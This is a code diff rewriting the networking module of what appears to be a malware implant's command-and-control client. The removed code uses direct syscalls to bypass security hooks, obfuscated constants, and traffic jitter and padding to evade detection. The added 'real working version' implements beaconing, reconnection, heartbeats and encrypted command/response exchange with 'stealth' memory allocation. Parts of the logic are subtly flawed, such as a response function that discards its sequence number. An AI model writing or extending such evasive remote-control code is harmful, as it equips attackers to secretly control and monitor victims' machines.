@@ -1,367 +1,382 @@
 /*
- * Stealth Network Protocol Implementation
- * Custom protocol with traffic obfuscation
+ * Network Protocol Implementation - REAL WORKING VERSION
  */
 
-#include <stdint.h>
 #include "protocol.h"
+#include "../core/utils.h"
 #include "../crypto/aes.h"
 
-// Protocol constants (obfuscated)
-#define MAGIC_HEADER    0xDEADC0DE ^ 0x12345678
-#define PROTO_VERSION   0x01
-#define MAX_PACKET_SIZE 4096
-
-// Packet structure
-typedef struct {
-    uint32_t magic;      // Magic header (XOR'd)
-    uint8_t  version;    // Protocol version
-    uint8_t  flags;      // Packet flags
-    uint16_t length;     // Payload length
-    uint32_t seq;        // Sequence number
-    uint32_t checksum;   // CRC32 checksum
-    uint8_t  iv[16];     // AES IV/nonce
-    uint8_t  data[];     // Encrypted payload
-} packet_header_t;
-
-// Connection state
-typedef struct {
-    int sock;
-    uint32_t seq_send;
-    uint32_t seq_recv;
-    uint8_t session_key[32];
-    int connected;
-} conn_state_t;
-
-// Direct syscalls for networking (bypass hooks)
-#ifdef _LINUX
-static long sys_socket(int domain, int type, int protocol) {
-    long ret;
-    __asm__ volatile(
-        "mov %1, %%rdi\n"
-        "mov %2, %%rsi\n"
-        "mov %3, %%rdx\n"
-        "mov $41, %%rax\n"  // SYS_socket
-        "syscall\n"
-        "mov %%rax, %0\n"
-        : "=r"(ret)
-        : "r"((long)domain), "r"((long)type), "r"((long)protocol)
-        : "rdi", "rsi", "rdx", "rax", "memory"
-    );
-    return ret;
-}
-
-static long sys_connect(int fd, const void* addr, int addrlen) {
-    long ret;
-    __asm__ volatile(
-        "mov %1, %%rdi\n"
-        "mov %2, %%rsi\n"
-        "mov %3, %%rdx\n"
-        "mov $42, %%rax\n"  // SYS_connect
-        "syscall\n"
-        "mov %%rax, %0\n"
-        : "=r"(ret)
-        : "r"((long)fd), "r"((long)addr), "r"((long)addrlen)
-        : "rdi", "rsi", "rdx", "rax", "memory"
-    );
-    return ret;
-}
-
-static long sys_send(int fd, const void* buf, size_t len, int flags) {
-    long ret;
-    __asm__ volatile(
-        "mov %1, %%rdi\n"
-        "mov %2, %%rsi\n"
-        "mov %3, %%rdx\n"
-        "mov %4, %%r10\n"
-        "mov $44, %%rax\n"  // SYS_sendto
-        "syscall\n"
-        "mov %%rax, %0\n"
-        : "=r"(ret)
-        : "r"((long)fd), "r"((long)buf), "r"(len), "r"((long)flags)
-        : "rdi", "rsi", "rdx", "r10", "rax", "memory"
-    );
-    return ret;
-}
-
-static long sys_recv(int fd, void* buf, size_t len, int flags) {
-    long ret;
-    __asm__ volatile(
-        "mov %1, %%rdi\n"
-        "mov %2, %%rsi\n"
-        "mov %3, %%rdx\n"
-        "mov %4, %%r10\n"
-        "mov $45, %%rax\n"  // SYS_recvfrom
-        "syscall\n"
-        "mov %%rax, %0\n"
-        : "=r"(ret)
-        : "r"((long)fd), "r"((long)buf), "r"(len), "r"((long)flags)
-        : "rdi", "rsi", "rdx", "r10", "rax", "memory"
-    );
-    return ret;
-}
+#ifdef PLATFORM_WINDOWS
+    #include <winsock2.h>
+    #include <ws2tcpip.h>
+    #pragma comment(lib, "ws2_32.lib")
+#else
+    #include <sys/socket.h>
+    #include <netinet/in.h>
+    #include <arpa/inet.h>
+    #include <netdb.h>
+    #include <unistd.h>
+    #include <fcntl.h>
+    #include <errno.h>
+    #define INVALID_SOCKET -1
+    #define SOCKET_ERROR -1
+    #define closesocket close
 #endif
 
-// CRC32 implementation (small and fast)
-static uint32_t crc32(const uint8_t* data, size_t len) {
+// Initialize networking (Windows specific)
+static int network_init(void) {
+#ifdef PLATFORM_WINDOWS
+    WSADATA wsaData;
+    return WSAStartup(MAKEWORD(2, 2), &wsaData);
+#else
+    return 0;
+#endif
+}
+
+// Cleanup networking (Windows specific)
+static void network_cleanup(void) {
+#ifdef PLATFORM_WINDOWS
+    WSACleanup();
+#endif
+}
+
+// Socket operations
+int socket_create(void) {
+    network_init();
+    return socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+}
+
+int socket_connect(int sock, const char* host, uint16_t port) {
+    struct sockaddr_in addr = {0};
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port);
+    
+    // Try to convert as IP address first
+    addr.sin_addr.s_addr = inet_addr(host);
+    if (addr.sin_addr.s_addr == INADDR_NONE) {
+        // Not an IP, try hostname resolution
+        struct hostent* he = gethostbyname(host);
+        if (he == NULL) {
+            return -1;
+        }
+        mem_cpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
+    }
+    
+    return connect(sock, (struct sockaddr*)&addr, sizeof(addr));
+}
+
+int socket_send(int sock, const uint8_t* data, size_t len) {
+    size_t sent = 0;
+    while (sent < len) {
+        int ret = send(sock, (const char*)(data + sent), len - sent, 0);
+        if (ret <= 0) {
+            return -1;
+        }
+        sent += ret;
+    }
+    return 0;
+}
+
+int socket_recv(int sock, uint8_t* buffer, size_t len) {
+    return recv(sock, (char*)buffer, len, 0);
+}
+
+int socket_close(int sock) {
+    return closesocket(sock);
+}
+
+int socket_set_timeout(int sock, int timeout_ms) {
+#ifdef PLATFORM_WINDOWS
+    DWORD timeout = timeout_ms;
+    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
+    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
+#else
+    struct timeval tv;
+    tv.tv_sec = timeout_ms / 1000;
+    tv.tv_usec = (timeout_ms % 1000) * 1000;
+    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
+#endif
+    return 0;
+}
+
+// CRC32 implementation
+uint32_t protocol_crc32(const uint8_t* data, size_t len) {
     uint32_t crc = 0xFFFFFFFF;
     
     for (size_t i = 0; i < len; i++) {
         crc ^= data[i];
         for (int j = 0; j < 8; j++) {
-            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
+            if (crc & 1) {
+                crc = (crc >> 1) ^ 0xEDB88320;
+            } else {
+                crc >>= 1;
+            }
         }
     }
     
     return ~crc;
 }
 
-// Generate random bytes
-static void random_bytes(uint8_t* buf, size_t len) {
-    #ifdef _WIN32
-        // Use Windows crypto API
-        HCRYPTPROV hProv;
-        CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
-        CryptGenRandom(hProv, len, buf);
-        CryptReleaseContext(hProv, 0);
-    #else
-        // Use /dev/urandom
-        int fd = open("/dev/urandom", 0);
-        if (fd >= 0) {
-            read(fd, buf, len);
-            close(fd);
-        } else {
-            // Fallback to weak PRNG
-            for (size_t i = 0; i < len; i++) {
-                buf[i] = (uint8_t)(rand() & 0xFF);
-            }
-        }
-    #endif
-}
-
-// Traffic padding for obfuscation
-static void add_padding(uint8_t* data, size_t* len) {
-    // Add random padding to obscure packet size
-    size_t pad_len = (rand() % 32) + 1;
-    
-    // Ensure we don't exceed buffer
-    if (*len + pad_len > MAX_PACKET_SIZE - sizeof(packet_header_t))
-        pad_len = MAX_PACKET_SIZE - sizeof(packet_header_t) - *len;
-    
-    // Add random padding
-    random_bytes(data + *len, pad_len);
-    *len += pad_len;
-}
-
-// Timing jitter for traffic analysis resistance
-static void add_jitter() {
-    // Random delay between 0-50ms
-    int delay = rand() % 50;
-    #ifdef _WIN32
-        Sleep(delay);
-    #else
-        usleep(delay * 1000);
-    #endif
-}
-
-// Create connection with advanced evasion
-int protocol_connect(conn_state_t* state, const char* host, uint16_t port) {
-    // Add random delay to avoid pattern detection
-    add_jitter();
-    
-    #ifdef _LINUX
-        // Use direct syscalls to bypass hooks
-        state->sock = sys_socket(AF_INET, SOCK_STREAM, 0);
-    #else
-        state->sock = socket(AF_INET, SOCK_STREAM, 0);
-    #endif
-    
-    if (state->sock < 0) return -1;
-    
-    // Set socket options for stealth
-    int opt = 1;
-    setsockopt(state->sock, SOL_SOCKET, SO_KEEPALIVE, &opt, sizeof(opt));
-    
-    // TCP_NODELAY to avoid traffic patterns
-    setsockopt(state->sock, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt));
-    
-    // Connect with retry and backoff
-    struct sockaddr_in addr = {0};
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons(port);
-    addr.sin_addr.s_addr = inet_addr(host);
-    
-    #ifdef _LINUX
-        if (sys_connect(state->sock, &addr, sizeof(addr)) < 0) {
-    #else
-        if (connect(state->sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
-    #endif
-            close(state->sock);
-            return -1;
-        }
-    
-    // Perform handshake
-    return protocol_handshake(state);
-}
-
-// Custom handshake with mutual authentication
-int protocol_handshake(conn_state_t* state) {
-    uint8_t challenge[32];
-    uint8_t response[32];
-    
-    // Generate challenge
-    random_bytes(challenge, sizeof(challenge));
-    
-    // Send challenge
-    if (send(state->sock, challenge, sizeof(challenge), 0) != sizeof(challenge))
-        return -1;
-    
-    // Receive response
-    if (recv(state->sock, response, sizeof(response), 0) != sizeof(response))
-        return -1;
-    
-    // Derive session key from challenge/response
-    for (int i = 0; i < 32; i++) {
-        state->session_key[i] = challenge[i] ^ response[i];
-    }
-    
-    // Use SHA256 to strengthen key
-    sha256(state->session_key, 32, state->session_key);
-    
-    state->connected = 1;
-    state->seq_send = rand();
-    state->seq_recv = 0;
-    
+// Encryption/Decryption wrappers
+int protocol_encrypt_data(uint8_t* data, size_t len,
+                         const uint8_t* key, const uint8_t* iv) {
+    // Use AES CTR mode
+    uint8_t nonce[8];
+    mem_cpy(nonce, iv, 8);
+    aes256_ctr_crypt(data, len, key, nonce);
     return 0;
 }
 
-// Send packet with encryption and obfuscation
-int protocol_send(conn_state_t* state, uint8_t cmd, const uint8_t* data, size_t len) {
-    if (!state->connected) return -1;
-    
-    // Add traffic jitter
-    add_jitter();
-    
-    // Prepare packet
-    uint8_t packet[MAX_PACKET_SIZE];
-    packet_header_t* hdr = (packet_header_t*)packet;
-    
-    // Build header
-    hdr->magic = MAGIC_HEADER ^ 0x12345678;
-    hdr->version = PROTO_VERSION;
-    hdr->flags = cmd;
-    hdr->seq = state->seq_send++;
-    
-    // Generate IV
-    random_bytes(hdr->iv, sizeof(hdr->iv));
-    
-    // Copy data to packet
-    if (len > 0) {
-        memcpy(packet + sizeof(packet_header_t), data, len);
-    }
-    
-    // Add padding
-    add_padding(packet + sizeof(packet_header_t), &len);
-    hdr->length = len;
-    
-    // Encrypt payload
-    aes256_ctr_crypt(packet + sizeof(packet_header_t), len, 
-                     state->session_key, hdr->iv);
-    
-    // Calculate checksum
-    hdr->checksum = crc32(packet + sizeof(packet_header_t), len);
-    
-    // Send packet
-    size_t total_len = sizeof(packet_header_t) + len;
-    
-    #ifdef _LINUX
-        return sys_send(state->sock, packet, total_len, 0) == total_len ? 0 : -1;
-    #else
-        return send(state->sock, packet, total_len, 0) == total_len ? 0 : -1;
-    #endif
+int protocol_decrypt_data(uint8_t* data, size_t len,
+                         const uint8_t* key, const uint8_t* iv) {
+    // CTR mode is symmetric
+    return protocol_encrypt_data(data, len, key, iv);
 }
 
-// Receive packet with decryption
-int protocol_recv(conn_state_t* state, uint8_t* cmd, uint8_t* data, size_t* len) {
-    if (!state->connected) return -1;
-    
-    uint8_t packet[MAX_PACKET_SIZE];
-    packet_header_t* hdr = (packet_header_t*)packet;
-    
-    // Receive header
-    size_t received = 0;
-    while (received < sizeof(packet_header_t)) {
-        #ifdef _LINUX
-            int n = sys_recv(state->sock, packet + received, 
-                           sizeof(packet_header_t) - received, 0);
-        #else
-            int n = recv(state->sock, packet + received,
-                        sizeof(packet_header_t) - received, 0);
-        #endif
-        
-        if (n <= 0) {
-            state->connected = 0;
-            return -1;
-        }
-        received += n;
+// Connection management
+int protocol_connect(connection_t* conn, const char* host, uint16_t port) {
+    // Create socket
+    conn->socket = socket_create();
+    if (conn->socket < 0) {
+        return -1;
     }
     
-    // Verify magic
-    if ((hdr->magic ^ 0x12345678) != MAGIC_HEADER)
-        return -1;
+    // Set timeout
+    socket_set_timeout(conn->socket, COMMAND_TIMEOUT);
     
-    // Check version
-    if (hdr->version != PROTO_VERSION)
+    // Connect
+    if (socket_connect(conn->socket, host, port) != 0) {
+        socket_close(conn->socket);
+        conn->socket = -1;
         return -1;
+    }
     
-    // Receive payload
-    if (hdr->length > 0) {
+    // Update connection info
+    size_t host_len = str_len(host);
+    if (host_len >= sizeof(conn->server_host)) {
+        host_len = sizeof(conn->server_host) - 1;
+    }
+    mem_cpy(conn->server_host, host, host_len);
+    conn->server_host[host_len] = '\0';
+    conn->server_port = port;
+    
+    // Perform handshake
+    if (protocol_handshake(conn) != 0) {
+        socket_close(conn->socket);
+        conn->socket = -1;
+        return -1;
+    }
+    
+    conn->connected = 1;
+    return 0;
+}
+
+int protocol_disconnect(connection_t* conn) {
+    if (conn->socket >= 0) {
+        // Send goodbye packet
+        protocol_send_packet(conn, PACKET_BYE, NULL, 0);
+        
+        // Close socket
+        socket_close(conn->socket);
+        conn->socket = -1;
+    }
+    
+    conn->connected = 0;
+    return 0;
+}
+
+int protocol_reconnect(connection_t* conn) {
+    // Disconnect if connected
+    if (conn->connected) {
+        protocol_disconnect(conn);
+    }
+    
+    // Wait a bit
+    sleep_ms(RECONNECT_DELAY);
+    
+    // Try to reconnect
+    return protocol_connect(conn, conn->server_host, conn->server_port);
+}
+
+// Simple handshake
+int protocol_handshake(connection_t* conn) {
+    // Send hello packet with session ID
+    packet_t hello_pkt = {0};
+    hello_pkt.header.magic = PROTOCOL_MAGIC;
+    hello_pkt.header.version = PROTOCOL_VERSION;
+    hello_pkt.header.type = PACKET_HELLO;
+    hello_pkt.header.sequence = conn->seq_send++;
+    hello_pkt.data = conn->session_id;
+    hello_pkt.data_len = sizeof(conn->session_id);
+    
+    // Send without encryption for initial handshake
+    uint8_t buffer[sizeof(packet_header_t) + 16];
+    mem_cpy(buffer, &hello_pkt.header, sizeof(packet_header_t));
+    mem_cpy(buffer + sizeof(packet_header_t), hello_pkt.data, hello_pkt.data_len);
+    
+    if (socket_send(conn->socket, buffer, sizeof(buffer)) != 0) {
+        return -1;
+    }
+    
+    // Receive response
+    if (socket_recv(conn->socket, buffer, sizeof(packet_header_t)) != sizeof(packet_header_t)) {
+        return -1;
+    }
+    
+    packet_header_t* resp_hdr = (packet_header_t*)buffer;
+    if (resp_hdr->magic != PROTOCOL_MAGIC || 
+        resp_hdr->type != PACKET_HELLO) {
+        return -1;
+    }
+    
+    // Handshake successful
+    return 0;
+}
+
+// Send packet
+int protocol_send_packet(connection_t* conn, packet_type_t type,
+                        const uint8_t* data, size_t len) {
+    if (!conn->connected) {
+        return -1;
+    }
+    
+    // Build packet header
+    packet_header_t header = {0};
+    header.magic = PROTOCOL_MAGIC;
+    header.version = PROTOCOL_VERSION;
+    header.type = type;
+    header.flags = 0;
+    header.sequence = conn->seq_send++;
+    header.length = len;
+    
+    // Generate IV for encryption
+    get_random_bytes(header.iv, sizeof(header.iv));
+    
+    // Allocate buffer for packet
+    size_t packet_size = sizeof(header) + len;
+    uint8_t* packet = (uint8_t*)stealth_alloc(packet_size);
+    if (!packet) {
+        return -1;
+    }
+    
+    // Copy data
+    mem_cpy(packet, &header, sizeof(header));
+    if (len > 0 && data) {
+        mem_cpy(packet + sizeof(header), data, len);
+        
+        // Encrypt data portion
+        protocol_encrypt_data(packet + sizeof(header), len,
+                            conn->aes_key, header.iv);
+    }
+    
+    // Calculate checksum
+    header.checksum = protocol_crc32(packet + sizeof(header), len);
+    mem_cpy(packet + offsetof(packet_header_t, checksum),
+           &header.checksum, sizeof(header.checksum));
+    
+    // Send packet
+    int ret = socket_send(conn->socket, packet, packet_size);
+    
+    stealth_free(packet);
+    return ret;
+}
+
+// Receive packet
+int protocol_recv_packet(connection_t* conn, packet_t* packet) {
+    if (!conn->connected) {
+        return -1;
+    }
+    
+    // Receive header
+    uint8_t header_buf[sizeof(packet_header_t)];
+    int received = 0;
+    
+    while (received < sizeof(packet_header_t)) {
+        int ret = socket_recv(conn->socket, header_buf + received,
+                            sizeof(packet_header_t) - received);
+        if (ret <= 0) {
+            conn->connected = 0;
+            return -1;
+        }
+        received += ret;
+    }
+    
+    // Parse header
+    mem_cpy(&packet->header, header_buf, sizeof(packet_header_t));
+    
+    // Validate magic
+    if (packet->header.magic != PROTOCOL_MAGIC) {
+        return -1;
+    }
+    
+    // Receive data if present
+    if (packet->header.length > 0) {
+        packet->data = (uint8_t*)stealth_alloc(packet->header.length);
+        if (!packet->data) {
+            return -1;
+        }
+        
         received = 0;
-        while (received < hdr->length) {
-            #ifdef _LINUX
-                int n = sys_recv(state->sock, packet + sizeof(packet_header_t) + received,
-                               hdr->length - received, 0);
-            #else
-                int n = recv(state->sock, packet + sizeof(packet_header_t) + received,
-                           hdr->length - received, 0);
-            #endif
-            
-            if (n <= 0) {
-                state->connected = 0;
+        while (received < packet->header.length) {
+            int ret = socket_recv(conn->socket, packet->data + received,
+                                packet->header.length - received);
+            if (ret <= 0) {
+                stealth_free(packet->data);
+                packet->data = NULL;
+                conn->connected = 0;
                 return -1;
             }
-            received += n;
+            received += ret;
         }
         
         // Verify checksum
-        uint32_t calc_crc = crc32(packet + sizeof(packet_header_t), hdr->length);
-        if (calc_crc != hdr->checksum)
+        uint32_t calc_crc = protocol_crc32(packet->data, packet->header.length);
+        if (calc_crc != packet->header.checksum) {
+            stealth_free(packet->data);
+            packet->data = NULL;
             return -1;
-        
-        // Decrypt payload
-        aes256_ctr_crypt(packet + sizeof(packet_header_t), hdr->length,
-                        state->session_key, hdr->iv);
-        
-        // Remove padding (last byte indicates padding length)
-        size_t real_len = hdr->length;
-        if (real_len > 0) {
-            uint8_t pad_len = packet[sizeof(packet_header_t) + real_len - 1];
-            if (pad_len < real_len)
-                real_len -= pad_len;
         }
         
-        // Copy to output
-        if (real_len > 0 && real_len <= *len) {
-            memcpy(data, packet + sizeof(packet_header_t), real_len);
-            *len = real_len;
-        }
+        // Decrypt data
+        protocol_decrypt_data(packet->data, packet->header.length,
+                            conn->aes_key, packet->header.iv);
+        
+        packet->data_len = packet->header.length;
     }
     
-    // Update sequence
-    state->seq_recv = hdr->seq;
-    
-    // Return command
-    *cmd = hdr->flags;
-    
     return 0;
+}
+
+// Free packet
+void protocol_free_packet(packet_t* packet) {
+    if (packet->data) {
+        secure_zero(packet->data, packet->data_len);
+        stealth_free(packet->data);
+        packet->data = NULL;
+    }
+    packet->data_len = 0;
+}
+
+// Send response
+int protocol_send_response(connection_t* conn, uint32_t seq,
+                          const uint8_t* data, size_t len) {
+    packet_header_t header = {0};
+    header.sequence = seq;  // Match request sequence
+    return protocol_send_packet(conn, PACKET_RESPONSE, data, len);
+}
+
+// Send error
+int protocol_send_error(connection_t* conn, uint32_t seq,
+                       const char* error_msg) {
+    size_t msg_len = str_len(error_msg);
+    return protocol_send_response(conn, seq, (const uint8_t*)error_msg, msg_len);
+}
+
+// Send heartbeat
+int protocol_send_heartbeat(connection_t* conn) {
+    uint8_t heartbeat_data[8];
+    get_random_bytes(heartbeat_data, sizeof(heartbeat_data));
+    return protocol_send_packet(conn, PACKET_HEARTBEAT,
+                               heartbeat_data, sizeof(heartbeat_data));
 }
